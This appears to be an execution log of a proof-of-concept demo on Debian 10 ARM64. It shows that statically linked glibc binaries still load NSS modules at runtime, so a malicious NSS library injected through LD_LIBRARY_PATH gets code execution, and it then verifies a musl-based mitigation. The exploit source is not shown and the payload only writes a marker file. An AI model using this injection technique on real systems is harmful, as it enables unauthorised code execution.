# Execution Log: Debian 10 Buster (glibc 2.28)

**Environment:**

- **OS:** Debian 10 Buster
- **Kernel:** Linux 4.19.0-9-arm64
- **Architecture:** ARM64 (aarch64)
- **glibc version:** 2.28 (Legacy, < 2.34)

---

## 1. System Environment Analysis

```text
→ User Context
uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev)

→ Kernel Information
Linux debian 4.19.0-9-arm64 #1 SMP Debian 4.19.118-2 (2020-04-29) aarch64 GNU/Linux

→ C Standard Library
  glibc version: 2.28
  Status: Legacy (< 2.34) - 'dns' and 'files' loaded via dlopen()

→ Mitigation Toolchain (musl)
[+] musl-gcc available: 8.3.0

→ NSS Configuration (/etc/nsswitch.conf)
  hosts:          files mdns4_minimal [NOTFOUND=return] dns

  Module Vulnerability Analysis:
    ✗ libnss_files.so.2 — loaded via dlopen() (VULNERABLE on glibc < 2.34)
    ✗ libnss_dns.so.2 — loaded via dlopen() (VULNERABLE on glibc < 2.34)
    ✗ libnss_mdns4_minimal.so.2 — loaded via dlopen() (ALWAYS VULNERABLE)

  Note for legacy glibc: In older versions, even 'files' is loaded dynamically.
  During a single DNS resolution, libnss_files.so.2 can be dlopen()'d hundreds of times!
```

## 2. Build Process

```text
[*] Compiling all targets...

cc -Wall -Wextra -static -o gateway src/main.c
/usr/bin/ld: /tmp/ccmkfdy3.o: in function `main':
main.c:(.text+0x50): warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking

cc -Wall -Wextra -shared -fPIC -Wl,-soname,libnss_resolve.so.2 -o libnss_resolve.so.2 src/exploit.c
[+] Universal payload built. Creating symlinks for all NSS modules...
[+] Symlinks created: libnss_resolve.so.2 libnss_dns.so.2 libnss_myhostname.so.2 libnss_mdns4_minimal.so.2
[+] gateway_musl compiled successfully.

[+] Build completed successfully
→ Build Artifacts
  gateway: 653K
  gateway_musl: 90K
  libnss_dns.so.2: 19
  libnss_mdns4_minimal.so.2: 19
  libnss_myhostname.so.2: 19
  libnss_resolve.so.2: 9.0K
```

## 3. Vulnerable Binary Analysis

```text
→ Binary Type Verification
  File type: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.7.0, BuildID[sha1]=b5c5eeec21f5d107e620b52a97c9369659e3e830, not stripped
  Dynamic check: not a dynamic executable

→ Runtime Library Loading Analysis (strace)
  Intercepting system calls during DNS resolution...

  External Shared Libraries Loaded:
    ✗ /lib/aarch64-linux-gnu/libnss_dns.so.2
    ✗ /lib/aarch64-linux-gnu/libnss_files.so.2
    ✗ /lib/aarch64-linux-gnu/libnss_mdns4_minimal.so.2
    ✗ /lib/aarch64-linux-gnu/libc.so.6 (Dynamic libc cascaded!)
    ✗ /lib/aarch64-linux-gnu/ld-linux-aarch64.so.1 (Dynamic linker cascaded!)
```

## 4. Exploitation Demonstration

```text
→ Attack Vector Analysis
  Current NSS chain: files mdns4_minimal [NOTFOUND=return] dns

  Potential dlopen() Triggers:
    ✓ libnss_dns.so.2 — will be loaded via dlopen()
    ✓ libnss_mdns4_minimal.so.2 — will be loaded via dlopen()
    ✓ libnss_files.so.2 — will be loaded via dlopen()

→ Payload Delivery
  Injecting malicious NSS module via LD_LIBRARY_PATH...
  [*] Executing: LD_LIBRARY_PATH=. ./gateway
[+] Gateway started. Resolving blog.jarpex.com...
[-] Resolution failed: Name or service not known

→ Exploitation Verification
[+] EXPLOITATION SUCCESSFUL
  Payload Output (/tmp/pwned.txt):
    === PWNED BY NSS ===
    uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## 5. Mitigation Verification (musl libc)

```text
→ Hardened Binary Analysis (strace)
  File Access During DNS Resolution:
    ✓ /etc/hosts (config file)
    ✓ /etc/resolv.conf (config file)

[+] ISOLATION VERIFIED: No external shared libraries loaded.
```

## 6. Cleanup

```text
[*] Removing build artifacts and exploit traces...
rm -f gateway gateway_musl
rm -f libnss_resolve.so.2 libnss_dns.so.2 libnss_myhostname.so.2 libnss_mdns4_minimal.so.2
rm -f /tmp/pwned.txt
[+] Cleanup completed
```
